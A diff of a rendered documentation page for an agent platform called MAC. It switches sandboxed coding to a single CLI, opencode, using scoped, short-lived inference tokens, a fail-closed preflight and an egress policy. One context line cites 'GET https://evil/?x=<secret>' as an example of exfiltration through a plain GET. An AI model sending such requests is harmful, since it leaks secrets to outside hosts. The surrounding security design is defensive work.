@@ -1853,16 +1853,38 @@
 </li>
       
         <li class="md-nav__item">
-  <a href="#coding-agent-clis-in-the-sandbox" class="md-nav__link">
+  <a href="#the-coding-cli-in-the-sandbox" class="md-nav__link">
     <span class="md-ellipsis">
       
-        Coding-agent CLIs in the sandbox
+        The coding CLI in the sandbox
       
     </span>
   </a>
   
-    <nav class="md-nav" aria-label="Coding-agent CLIs in the sandbox">
+    <nav class="md-nav" aria-label="The coding CLI in the sandbox">
       <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#opencode-through-the-hub-model-router" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        opencode through the hub model router
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#the-in-sandbox-route-proof" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        The in-sandbox route proof
+      
+    </span>
+  </a>
+  
+</li>
         
           <li class="md-nav__item">
   <a href="#environment-knobs_1" class="md-nav__link">
@@ -2206,16 +2228,38 @@
 </li>
       
         <li class="md-nav__item">
-  <a href="#coding-agent-clis-in-the-sandbox" class="md-nav__link">
+  <a href="#the-coding-cli-in-the-sandbox" class="md-nav__link">
     <span class="md-ellipsis">
       
-        Coding-agent CLIs in the sandbox
+        The coding CLI in the sandbox
       
     </span>
   </a>
   
-    <nav class="md-nav" aria-label="Coding-agent CLIs in the sandbox">
+    <nav class="md-nav" aria-label="The coding CLI in the sandbox">
       <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#opencode-through-the-hub-model-router" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        opencode through the hub model router
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#the-in-sandbox-route-proof" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        The in-sandbox route proof
+      
+    </span>
+  </a>
+  
+</li>
         
           <li class="md-nav__item">
   <a href="#environment-knobs_1" class="md-nav__link">
@@ -2509,7 +2553,7 @@ could be configured with only <code>[openshell.drivers.docker]</code> while stil
 image store. This mismatch is resolved in OpenShell 0.0.72 (the current fleet
 pin). <code>bootstrap-openshell.sh</code> retains the <code>mirror_image_for_openshell_runtime</code>
 step as belt-and-suspenders, and still runs an <code>openshell sandbox create</code> smoke
-test that verifies <code>gh</code> and <code>codex</code> are visible. Bootstrap then
+test that verifies <code>gh</code> and <code>opencode</code> are visible. Bootstrap then
 runs <code>live-confinement-probe.sh</code> inside a second throwaway sandbox and fails
 closed unless the runtime proves the expected filesystem, egress, privilege,
 seccomp, user-namespace, and raw-socket boundaries.</p>
@@ -2805,55 +2849,131 @@ axis, because <code>GET https://evil/?x=&lt;secret&gt;</code> is exfiltration wi
    appears in OpenShell logs, <code>/action-events</code>, the dashboard Observability
    action feed, memory summary eligibility, and OTLP export.</li>
 </ol>
-<h2 id="coding-agent-clis-in-the-sandbox">Coding-agent CLIs in the sandbox<a class="headerlink" href="#coding-agent-clis-in-the-sandbox" title="Permanent link">&para;</a></h2>
-<p>The executor prefers an installed, authenticated coding-agent CLI (Claude Code,
-Codex, Cursor) over a direct LLM-gateway run, because those CLIs authenticate
-against a subscription/seat instead of a metered API token (see
-<code>src/mac/coding_agent.py</code>). A coding-agent run is launched exactly like the
-Hermes run — inside the same OpenShell sandbox, under the same policy — so the
-guardrails are unchanged.</p>
-<p><strong>Working outside the sandbox is not sufficient to enable a coding CLI.</strong> When
+<h2 id="the-coding-cli-in-the-sandbox">The coding CLI in the sandbox<a class="headerlink" href="#the-coding-cli-in-the-sandbox" title="Permanent link">&para;</a></h2>
+<h3 id="opencode-through-the-hub-model-router">opencode through the hub model router<a class="headerlink" href="#opencode-through-the-hub-model-router" title="Permanent link">&para;</a></h3>
+<p>MAC supports exactly one coding CLI: opencode. It gets its model from the hub's
+OpenAI-compatible router (<code>$MAC_HUB_URL/v1</code>), which fails over across the
+providers in <code>MAC_ROUTER_PROVIDERS</code>. Provider failover lives only there; the
+executor never re-runs a task on a different CLI.</p>
+<p>The worker token never enters the sandbox: it can claim tasks and write the
+ledger. Instead, for each task:</p>
+<ol>
+<li>The executor, on the host, calls <code>POST /agents/{agent_id}/inference-tokens</code>
+   with the worker token. The hub returns a token bound to that agent with only
+   the <code>inference</code> scope. It lives 6 hours and is revoked when the task ends.
+   The hub keeps only its sha256 hash, in <code>inference_tokens</code>.</li>
+<li>The sandbox receives it as <code>MAC_INFERENCE_TOKEN</code>, with <code>MAC_HUB_URL</code> as the
+   sandbox sees it (a loopback hub becomes <code>host.openshell.internal</code>).</li>
+<li>The executor writes <code>.mac-opencode.json</code> into the uploaded workspace and
+   points <code>OPENCODE_CONFIG</code> at it. Its only provider is <code>machub</code>:</li>
+</ol>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a><span class="p">{</span>
+<a id="__codelineno-5-2" name="__codelineno-5-2" href="#__codelineno-5-2"></a><span class="w">  </span><span class="nt">&quot;model&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;machub/gpt-5.6-sol&quot;</span><span class="p">,</span>
+<a id="__codelineno-5-3" name="__codelineno-5-3" href="#__codelineno-5-3"></a><span class="w">  </span><span class="nt">&quot;autoupdate&quot;</span><span class="p">:</span><span class="w"> </span><span class="kc">false</span><span class="p">,</span>
+<a id="__codelineno-5-4" name="__codelineno-5-4" href="#__codelineno-5-4"></a><span class="w">  </span><span class="nt">&quot;provider&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
+<a id="__codelineno-5-5" name="__codelineno-5-5" href="#__codelineno-5-5"></a><span class="w">    </span><span class="nt">&quot;machub&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
+<a id="__codelineno-5-6" name="__codelineno-5-6" href="#__codelineno-5-6"></a><span class="w">      </span><span class="nt">&quot;npm&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;@ai-sdk/openai-compatible&quot;</span><span class="p">,</span>
+<a id="__codelineno-5-7" name="__codelineno-5-7" href="#__codelineno-5-7"></a><span class="w">      </span><span class="nt">&quot;options&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
+<a id="__codelineno-5-8" name="__codelineno-5-8" href="#__codelineno-5-8"></a><span class="w">        </span><span class="nt">&quot;baseURL&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;http://&lt;hub&gt;:&lt;port&gt;/v1&quot;</span><span class="p">,</span>
+<a id="__codelineno-5-9" name="__codelineno-5-9" href="#__codelineno-5-9"></a><span class="w">        </span><span class="nt">&quot;apiKey&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;{env:MAC_INFERENCE_TOKEN}&quot;</span><span class="p">,</span>
+<a id="__codelineno-5-10" name="__codelineno-5-10" href="#__codelineno-5-10"></a><span class="w">        </span><span class="nt">&quot;headers&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="nt">&quot;X-MAC-Task-ID&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;&lt;task id&gt;&quot;</span><span class="p">}</span>
+<a id="__codelineno-5-11" name="__codelineno-5-11" href="#__codelineno-5-11"></a><span class="w">      </span><span class="p">},</span>
+<a id="__codelineno-5-12" name="__codelineno-5-12" href="#__codelineno-5-12"></a><span class="w">      </span><span class="nt">&quot;models&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="nt">&quot;gpt-5.6-sol&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="nt">&quot;tool_call&quot;</span><span class="p">:</span><span class="w"> </span><span class="kc">true</span><span class="p">}}</span>
+<a id="__codelineno-5-13" name="__codelineno-5-13" href="#__codelineno-5-13"></a><span class="w">    </span><span class="p">}</span>
+<a id="__codelineno-5-14" name="__codelineno-5-14" href="#__codelineno-5-14"></a><span class="w">  </span><span class="p">}</span>
+<a id="__codelineno-5-15" name="__codelineno-5-15" href="#__codelineno-5-15"></a><span class="p">}</span>
+</code></pre></div>
+<ol>
+<li>opencode runs as <code>opencode run --auto --model machub/&lt;model&gt;</code>. The model is
+   <code>MAC_TASK_MODEL</code>, else <code>MAC_CODING_DEFAULT_MODEL</code>, else <code>gpt-5.6-sol</code>.
+   <code>MAC_CODING_MODELS</code> lists the models the config declares.</li>
+</ol>
+<p>An <code>inference</code> token may call <code>POST /v1/chat/completions</code> and
+<code>POST /v1/embeddings</code> and gets 403 everywhere else. The router attributes each
+call to the token's agent. Agent credentials keep reaching all of <code>/v1</code>. The
+policy's <code>opencode_router</code> block holds the opencode binaries to the same two
+routes on the hub host and port.</p>
+<p>The in-sandbox preflight mints a 15-minute token of its own and revokes it
+after the probe. Each logical model name must be one the hub's
+<code>MAC_ROUTER_PROVIDERS</code> aliases for every provider in its failover order.</p>
+<h3 id="the-in-sandbox-route-proof">The in-sandbox route proof<a class="headerlink" href="#the-in-sandbox-route-proof" title="Permanent link">&para;</a></h3>
+<p><strong>Working outside the sandbox is not sufficient to enable the coding CLI.</strong> When
 OpenShell confinement is in effect (the per-task wrap <em>or</em> the supervisor — i.e.
-<code>MAC_OPENSHELL_REQUIRED</code> truthy / the agent is required), coding-agent
-enablement is <strong>gated on a real in-sandbox preflight</strong>: a throwaway sandbox runs
-the CLI under the live policy + forwarded env and must echo a sentinel back,
-proving end-to-end that the <strong>binary exists, credentials resolve, and egress to
-the provider is permitted</strong> in the sandbox.</p>
+<code>MAC_OPENSHELL_REQUIRED</code> truthy / the agent is required), the route is <strong>gated
+on a real in-sandbox preflight</strong>: a throwaway sandbox runs opencode under the
+live policy with a short-lived inference token and must echo a sentinel back,
+proving end to end that the <strong>binary exists, the token is accepted, and egress
+to the hub router is permitted</strong> in the sandbox.</p>
 <p>The worker runs this probe before dispatch and publishes a secret-free
-<code>mac.coding_clis.v2</code> heartbeat record containing the CLI, provider, wire
-protocol, endpoint, authentication kind/source, model, route fingerprint, and
-the matching <code>mac.coding_agent.verification.v1</code> result. Repository dispatch to
-an OpenShell agent requires a fresh successful proof. A task-pinned model also
-requires proof for that exact model. Presence of a binary, credential variable,
-or credential directory is only <code>configured</code>; it is never <code>verified</code>.</p>
+<code>mac.coding_clis.v2</code> heartbeat record with a single <code>opencode</code> entry: provider,
+wire protocol, endpoint, authentication kind/source, model, route fingerprint,
+and the matching <code>mac.coding_agent.verification.v1</code> result. Repository dispatch
+to an OpenShell agent requires a fresh successful proof for that entry. A
+task-pinned model also requires proof for that exact model. Presence of the
+binary and a hub credential is only <code>configured</code>; it is never <code>verified</code>.</p>
 <p>A failed probe carries a <code>failure_class</code> in that
-<code>mac.coding_agent.verification.v1</code> record so the failure names its own repair.
-Two of those classes are easy to confuse because the sandbox proxy denies
-egress with the same HTTP status a provider uses to reject a credential:</p>
+<code>mac.coding_agent.verification.v1</code> record. It is derived from the exit status
+and from structured JSON error objects only; free-text output is never
+searched, because matching words in a transcript misclassifies runs (a sandbox
+named <code>mac-task-429907755059</code> was once classed as rate limited).</p>
 <table>
 <thead>
 <tr>
 <th><code>failure_class</code></th>
+<th>Source</th>
 <th>Meaning</th>
-<th>Repair</th>
 </tr>
 </thead>
 <tbody>
 <tr>
+<td><code>timeout</code></td>
+<td>exit 124 or 137</td>
+<td>The probe ran past <code>MAC_CODING_AGENT_PREFLIGHT_TIMEOUT</code>.</td>
+</tr>
+<tr>
+<td><code>agent_binary_missing</code></td>
+<td>exit 126 or 127</td>
+<td><code>opencode</code> is not runnable on the image PATH.</td>
+</tr>
+<tr>
 <td><code>sandbox_policy_denied</code></td>
-<td>The OpenShell egress policy refused the destination — the response carries a policy sentinel such as <code>policy_denied</code> or <code>not permitted by policy</code>.</td>
-<td>Allow the endpoint in the sandbox policy / fix the route. The credential is untouched.</td>
+<td><code>{"error": "policy_denied", ...}</code></td>
+<td>The OpenShell egress policy refused the destination. The credential is untouched.</td>
 </tr>
 <tr>
 <td><code>authentication_failed</code></td>
-<td>A genuine <code>401</code>/<code>403</code> (or an explicit invalid-key message) from the provider, with no policy sentinel.</td>
-<td>Repair the credential (<code>mac creds-sync</code>).</td>
+<td>JSON error code <code>invalid_api_key</code>/<code>unauthorized</code>, or status 401/403</td>
+<td>The hub rejected the inference token.</td>
+</tr>
+<tr>
+<td><code>rate_limited</code></td>
+<td>JSON error code <code>rate_limit_exceeded</code>/<code>rate_limit_error</code>, or status 429</td>
+<td>The router throttled the probe.</td>
+</tr>
+<tr>
+<td><code>provider_server_error</code></td>
+<td>JSON error status 5xx</td>
+<td>The router or its provider failed the call.</td>
+</tr>
+<tr>
+<td><code>inference_token_unavailable</code></td>
+<td>—</td>
+<td>The worker could not mint the probe's token.</td>
+</tr>
+<tr>
+<td><code>sentinel_missing</code></td>
+<td>exit 0</td>
+<td>opencode ran but did not echo the sentinel.</td>
+</tr>
+<tr>
+<td><code>probe_failed</code></td>
+<td>anything else</td>
+<td>Read the probe output.</td>
 </tr>
 </tbody>
 </table>
-<p>Because a policy denial proves the CLI launched and opened a socket, its
-<code>binary_status</code> is <code>present</code>, and it is deliberately <em>not</em> reported as a CLI
-needing a credential sync.</p>
+<p>A policy denial or an authentication failure proves opencode launched and
+opened a socket, so its <code>binary_status</code> is <code>present</code>.</p>
 <p>The executor repeats the same fail-closed check after claim. If the selected
 CLI fails and the progress observer proves that the sandbox is clean and has no
 evidence manifest, repository bootstrap, tests, and publication are skipped;
@@ -2864,7 +2984,7 @@ refuses untracked or staged-new files. A coding agent must commit its own new
 files before finishing. If an otherwise successful executor run is preserved
 with passing contract-test evidence but is refused only at this
 boundary, inspect it without mutation first:</p>
-<div class="highlight"><pre><span></span><code><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a><span class="go">mac task recover-finalizer /path/to/task-workspace --json</span>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a><span class="go">mac task recover-finalizer /path/to/task-workspace --json</span>
 </code></pre></div>
 <p>Recovery is explicit and allow-listed. Repeat <code>--approve-new-file PATH</code> for
 every intended new path, provide the original executor <code>--evidence-id</code>, and add
@@ -2888,39 +3008,29 @@ and verification gates passed but before the guarded push confirmed a remote ref
 The interrupted run leaves a partial <code>mac-evidence.json</code> (with a
 <code>finalizer_interrupted</code> marker) and a <code>finalizer-progress.json</code> stuck in a
 non-terminal status. Resume it the same way:</p>
-<div class="highlight"><pre><span></span><code><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a><span class="go">mac task recover-stalled-finalizer /path/to/task-workspace --json</span>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a><span class="go">mac task recover-stalled-finalizer /path/to/task-workspace --json</span>
 </code></pre></div>
 <p>Add <code>--approve-new-file PATH</code> only for any new files the stalled finalizer left
 uncommitted, provide the original <code>--evidence-id</code>, and add <code>--execute</code>. MAC
 revalidates the preserved HEAD, commits any pending work with stalled-finalizer
 provenance, rebases, reruns both gates, and performs the shared guarded push.</p>
-<p>For a coding agent to pass the preflight, the deployment must ensure, <strong>inside
-the sandbox</strong>:</p>
+<p>For opencode to pass the preflight, the deployment must ensure, <strong>inside the
+sandbox</strong>:</p>
 <ol>
-<li><strong>Binary present</strong> — <code>claude</code> / <code>codex</code> / <code>cursor-agent</code> is in the sandbox
-   image (or uploaded via <code>MAC_OPENSHELL_CREATE_ARGS</code>). The standard MAC image
-   installs <code>codex</code>.</li>
-<li><strong>Credentials reachable and durable</strong> — supported environment routes
-   (<code>ANTHROPIC_API_KEY</code>, <code>ANTHROPIC_AUTH_TOKEN</code>, <code>CLAUDE_CODE_OAUTH_TOKEN</code>,
-   <code>CURSOR_AUTH_TOKEN</code>, <code>CURSOR_API_KEY</code>, <code>MAC_CODEX_TOKEN</code>, <code>CODEX_API_KEY</code>,
-   <code>OPENAI_API_KEY</code>) are
-   forwarded automatically. File-based Codex OAuth state
-   (<code>~/.codex/auth.json</code>) is not uploaded by default because OpenShell upload is
-   copy-only: a throwaway sandbox can consume and rotate the refresh token while
-   the replacement is lost with the sandbox. <code>bootstrap-openshell.sh</code> only
-   uploads Codex file auth when <code>MAC_OPENSHELL_UPLOAD_CODEX_AUTH=1</code>, and the
-   executor only retains and probes that upload when
-   <code>MAC_OPENSHELL_ALLOW_CODEX_FILE_AUTH=1</code> is also still set. A stale rendered
-   upload is removed at execution time, and <code>OPENAI_API_KEY</code> always suppresses
-   the file copy because environment auth wins.</li>
+<li><strong>Binary present</strong> — the standard MAC image installs <code>opencode</code> and gates the
+   build on <code>command -v opencode</code>.</li>
+<li><strong>A hub credential on the host</strong> — the worker needs <code>MAC_HUB_URL</code> and its
+   worker token to mint the inference token. No provider credential or
+   opencode <code>auth.json</code> is copied into the sandbox.</li>
 <li><strong>Baseline repo tools present</strong> — the MAC OpenShell image installs <code>git</code>
    and <code>gh</code>; custom images must provide the same baseline if they
    are used for repository work.</li>
 <li><strong>Egress allowed</strong> — the OpenShell policy's <code>network_policies</code> must permit the
-   hub/gateway, provider host (e.g. <code>api.anthropic.com</code>), git host, and Python
-   package index hosts used by repository bootstrap (<code>pypi.org</code> and
-   <code>files.pythonhosted.org</code> in the standard policy). The bundled fail-closed
-   default denies all egress, so the preflight fails closed there by design.</li>
+   hub (<code>mac_hub</code>, and <code>opencode_router</code> for the two inference routes), the git
+   host, and Python package index hosts used by repository bootstrap
+   (<code>pypi.org</code> and <code>files.pythonhosted.org</code> in the standard policy). The bundled
+   fail-closed default denies all egress, so the preflight fails closed there by
+   design.</li>
 </ol>
 <h3 id="environment-knobs_1">Environment knobs<a class="headerlink" href="#environment-knobs_1" title="Permanent link">&para;</a></h3>
 <table>
@@ -2935,12 +3045,12 @@ the sandbox</strong>:</p>
 <tr>
 <td><code>MAC_PREFER_CODING_AGENT</code></td>
 <td><code>1</code></td>
-<td>master switch; <code>0</code> always uses the Hermes → gateway path</td>
+<td>master switch; <code>0</code> disables the coding route and the executor fails closed</td>
 </tr>
 <tr>
 <td><code>MAC_CODING_AGENT</code></td>
-<td><em>(auto)</em></td>
-<td>pin to <code>claude</code>/<code>codex</code>/<code>cursor</code>, or <code>off</code> to disable</td>
+<td><em>(opencode)</em></td>
+<td><code>off</code> disables the coding route; any value other than <code>opencode</code> is ignored</td>
 </tr>
 <tr>
 <td><code>MAC_CODING_AGENT_SANDBOX</code></td>
@@ -2973,54 +3083,19 @@ the sandbox</strong>:</p>
 <td>maximum proof age accepted by dispatch</td>
 </tr>
 <tr>
-<td><code>MAC_CODING_AGENT_&lt;AGENT&gt;_CMD</code></td>
-<td><em>(built-in)</em></td>
-<td>override a CLI's invocation (shlex-split); prompt appended as the trailing arg</td>
-</tr>
-<tr>
-<td><code>MAC_CODING_AGENT_MESSAGING_MCP</code></td>
-<td><code>1</code></td>
-<td>register the messaging MCP server (unconfined path only, Claude)</td>
-</tr>
-<tr>
 <td><code>MAC_OPENSHELL_REPO_REQUIRES_CODING_AGENT</code></td>
 <td><code>1</code> in fleet deploy</td>
 <td>executor strict mode: repository tasks fail closed unless a coding CLI is verified in-sandbox</td>
 </tr>
 <tr>
-<td><code>MAC_OPENSHELL_UPLOAD_CODEX_AUTH</code></td>
-<td><code>0</code></td>
-<td>bootstrap opt-in to upload <code>~/.codex/auth.json</code> / <code>config.toml</code> into sandboxes</td>
+<td><code>MAC_CODING_MODELS</code></td>
+<td><code>gpt-5.6-sol</code></td>
+<td>logical models the generated opencode config declares</td>
 </tr>
 <tr>
-<td><code>MAC_OPENSHELL_ALLOW_CODEX_FILE_AUTH</code></td>
-<td><code>0</code></td>
-<td>executor opt-in to probe/use uploaded Codex file auth despite refresh-token rotation risk</td>
-</tr>
-<tr>
-<td><code>MAC_CODEX_BASE_URL</code></td>
-<td><code>OPENAI_BASE_URL</code></td>
-<td>explicit Codex provider endpoint; use a Responses-compatible endpoint</td>
-</tr>
-<tr>
-<td><code>MAC_CODEX_TOKEN</code></td>
-<td><em>(unset)</em></td>
-<td>bearer read by Codex through <code>env_key</code>; the value never appears in argv or telemetry</td>
-</tr>
-<tr>
-<td><code>MAC_CODEX_PROVIDER</code></td>
-<td>inferred</td>
-<td>secret-free custom provider id (<code>openai</code> for the built-in endpoint, otherwise <code>mac-router</code>)</td>
-</tr>
-<tr>
-<td><code>MAC_CODEX_WIRE_API</code></td>
-<td><code>responses</code></td>
-<td>Codex wire protocol recorded and rendered into per-run custom-provider config</td>
-</tr>
-<tr>
-<td><code>MAC_CODEX_MODEL</code></td>
-<td>fleet/task default</td>
-<td>model included in the route fingerprint and dispatch proof</td>
+<td><code>MAC_CODING_DEFAULT_MODEL</code></td>
+<td><code>gpt-5.6-sol</code></td>
+<td>model opencode runs on when the task does not pin one</td>
 </tr>
 </tbody>
 </table>
